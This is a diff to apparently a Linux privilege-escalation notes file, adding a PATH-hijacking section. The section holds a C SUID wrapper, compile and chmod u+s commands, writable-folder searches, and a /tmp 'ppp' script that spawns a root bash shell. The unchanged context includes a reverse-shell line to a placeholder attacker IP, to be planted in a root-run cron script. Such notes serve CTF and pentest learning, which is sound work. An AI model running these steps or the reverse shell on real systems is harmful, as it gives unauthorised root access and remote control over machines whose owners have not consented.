@@ -106,3 +106,62 @@ If a scheduled task is set to run with root privileges, and we can modify the sc
 
 If you get anything like that, add a reverse shell attack by adding the following command in that script file. Make sure that the script has the permission to run. If not, run `bash chmod +x <script_name>`
 `bash bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1`
+
+## 7. Priviledge Escalation through PATH environment variable
+
+You can find the $PATH folders using `bash echo $PATH` which will give you the folders where Linux will start searching for any command/executable files if it's not built into shell or not defined with an absolute path.
+How to leverage this:
+
+- What folders are located under $PATH
+- Does your current user have write privileges for any of these folders?
+- Can you modify $PATH?
+- Is there a script/application you can start that will be affected by this vulnerability?
+
+Now, write what.c file:
+
+```#include<unistd.h>
+void main(){
+  setuid(0), setgid(0), system("ppp");
+}
+```
+
+Now, make executables, set the SUID bit, search for writable folders under $PATH, create a binary named "what" and get the "what" script to run it. The binary will run with root priviledge as the SUID bit is set. So, it will try to execute "ppp" command from the folders under $PATH. Your task is to create the ppp script(just an echo) under any of the writable folder that can be accessible from $PATH.
+
+```bash
+gcc what.c -o what -w
+
+#set suid bit
+chmod u+s what
+
+#check whether s bit is set or not
+ls -l
+
+#Check for setuid bit for folders
+find / -perm -u=s -type f 2>/dev/null
+
+#search for writable folders under $PATH
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+#The following will also give subfolder names and  “grep -v proc” to get rid of the many results related to running processes
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+#As usually /tmp folder is available for writing a script. and set this folder under $PATH variable.
+export PATH=/tmp:$PATH
+echo $PATH
+cd /tmp && echo "/bin/bash" > ppp
+chmod 777 ppp
+ls -l ppp
+cd ..
+
+#Now go to the what binary file location and try to run that binary file
+whoami
+id
+
+./what
+
+#The following should be root
+whoami
+id
+
+```
+
+You might find that gcc isn't installed. Then you should look for a unusual folder that can be accessible. And you might find a binary file. Try to run that and follow what command it wants to execute. Then do the above part in one of the writable folders such as tmp, and run the binary file.
